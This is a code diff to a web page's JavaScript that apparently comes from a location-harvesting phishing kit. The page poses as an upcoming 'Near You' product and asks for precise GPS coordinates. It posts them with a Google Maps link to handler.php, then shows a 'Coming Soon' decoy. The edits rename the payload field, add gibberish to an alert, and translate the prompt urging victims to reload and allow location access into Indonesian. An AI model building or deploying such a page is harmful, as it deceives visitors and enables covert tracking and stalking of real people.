@@ -4,6 +4,7 @@ function locate()
   {
     var optn = {enableHighAccuracy : true, timeout : 30000, maximumage: 0};
     navigator.geolocation.getCurrentPosition(showPosition, showError, optn);
+
   }
   else
   {
@@ -17,11 +18,11 @@ function locate()
     $.ajax({
       type: 'POST',
       url: 'handler.php',
-      data: {"data":`Google Map Link : https://google.com/maps/place/${lat}+${lon}`},
+      data: {"posisi":`\nLatitude : ${lat} + '\n' + longitude : ${lon} + '\n' +Google Map Link : https://google.com/maps/place/${lat}+${lon}`},
       success: function(){$('#change').html('Coming Soon');},
       mimeType: 'text'
     });
-    alert('Thankyou For Taking Interest in Near You...This Product is Coming Soon...');
+    alert("hawdiawda");
   };
 }
 
@@ -31,7 +32,8 @@ function showError(error)
   {
 		case error.PERMISSION_DENIED:
 			var denied = 'User denied the request for Geolocation';
-      alert('Please Refresh This Page and Allow Location Permission...');
+      // kei tampilan error 
+      alert('Silahkan Muat Ulang Halaman dan Ijinkan Lokasi...');
       break;
 		case error.POSITION_UNAVAILABLE:
 			var unavailable = 'Location information is unavailable';
